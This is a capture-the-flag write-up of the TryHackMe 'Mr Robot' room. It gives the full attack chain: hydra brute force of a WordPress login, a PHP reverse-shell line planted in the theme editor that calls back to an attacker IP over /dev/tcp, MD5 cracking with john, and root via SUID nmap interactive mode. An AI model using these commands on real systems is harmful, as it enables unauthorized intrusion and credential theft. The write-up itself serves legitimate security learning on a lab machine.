# Mr Robot CTF — TryHackMe — Medium

> **Date:** 2026-05-28\
> **Platform:** TryHackMe\
> **Difficulty:** Medium\
> **Tags:** `#linux` `#wordpress` `#hydra` `#rce` `#md5` `#suid` `#nmap` `#privesc`

---

## Summary

Linux machine running a WordPress site themed around the Mr Robot TV show. Initial access obtained via credential brute force using a wordlist found in robots.txt. Exploitation achieved by injecting a reverse shell into the WordPress theme editor. Privilege escalation via an old SUID nmap binary with interactive mode.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN mrrobot.txt 10.112.181.199
```

**Open ports:**

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1 Ubuntu|
|80|HTTP|Apache httpd|
|443|HTTPS|Apache httpd|

---

## Enumeration

### robots.txt

```bash
curl http://10.112.181.199/robots.txt
```

**Found:**

- `fsocity.dic` — wordlist
- `key-1-of-3.txt` — first flag

### Key 1

```bash
curl http://10.112.181.199/key-1-of-3.txt
```

→ `THM{REDACTED}`

### Wordlist deduplication

```bash
curl -O http://10.112.181.199/fsocity.dic
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# 858160 → 11451 unique lines
```

### Directory bruteforce

```bash
gobuster dir -u http://10.112.181.199 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

**Key findings:**

|Path|Note|
|---|---|
|`/wp-login.php`|WordPress login|
|`/wp-admin`|WordPress dashboard|
|`/xmlrpc.php`|XML-RPC enabled|

---

## Exploitation

### WordPress Credential Brute Force

**Step 1 — Username enumeration:** WordPress reveals when a username exists vs doesn't.

```bash
hydra -L fsocity_uniq.dic -p test 10.112.181.199 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username" \
  -t 30
```

→ Username: `elliot`

**Step 2 — Password brute force:**

```bash
hydra -l elliot -P fsocity_uniq.dic 10.112.181.199 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username" \
  -t 30
```

→ Password: `ER28-0652`

**Credentials:**

|Field|Value|
|---|---|
|Username|`elliot`|
|Password|`ER28-0652`|

### Reverse Shell via WordPress Theme Editor

Logged in at `/wp-login.php`. Navigated to `Appearance → Editor → 404.php` and replaced content with:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.112.172.221/4444 0>&1'"); ?>
```

Started listener:

```bash
nc -lvnp 4444
```

Triggered the shell:

```
http://10.112.181.199/wp-content/themes/twentyfifteen/404.php
```

**Result:** Reverse shell as `www-data` ✅

### Shell stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## User Flag (Key 2)

Found a hashed password in `/home/robot/`:

```bash
ls -la /home/robot/
# key-2-of-3.txt (robot only)
# password.raw-md5 (world readable)

cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked with john:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
john --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt
```

→ Password: `abcdefghijklmnopqrstuvwxyz`

Switched to robot:

```bash
su robot
# abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

→ `THM{REDACTED}`

---

## Privilege Escalation

### SUID Nmap — Interactive Mode

```bash
find / -perm -u=s -type f 2>/dev/null
# → /usr/local/bin/nmap
```

Old nmap versions have an `--interactive` mode allowing shell commands:

```bash
nmap --interactive
!sh
whoami
# root
```

---

## Root Flag (Key 3)

```bash
cat /root/key-3-of-3.txt
```

→ `THM{REDACTED}`

---

## Lessons Learned

**1.** `robots.txt` exposed both a flag and a wordlist — always check it first, it can contain critical information left by careless developers.

**2.** WordPress username enumeration via different error messages is a classic attack vector — always brute force usernames before passwords to save time.

**3.** Old SUID binaries like nmap with `--interactive` mode are an instant root — always check GTFOBins for any unusual SUID binary found on the system.

---

## Attack Chain Summary

```
nmap → HTTP/HTTPS (WordPress)
→ robots.txt → key-1 + fsocity.dic
→ hydra username enum → elliot
→ hydra brute force → ER28-0652
→ WordPress Editor 404.php → reverse shell (www-data)
→ /home/robot/password.raw-md5 → john → abcdefghijklmnopqrstuvwxyz
→ su robot → key-2
→ SUID nmap --interactive → !sh → root
→ key-3
```

---

## References

- [TryHackMe - Mr Robot CTF](https://tryhackme.com/room/mrrobot)
- [HackTricks - WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [GTFOBins - nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [HackTricks - SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-and-sgid)
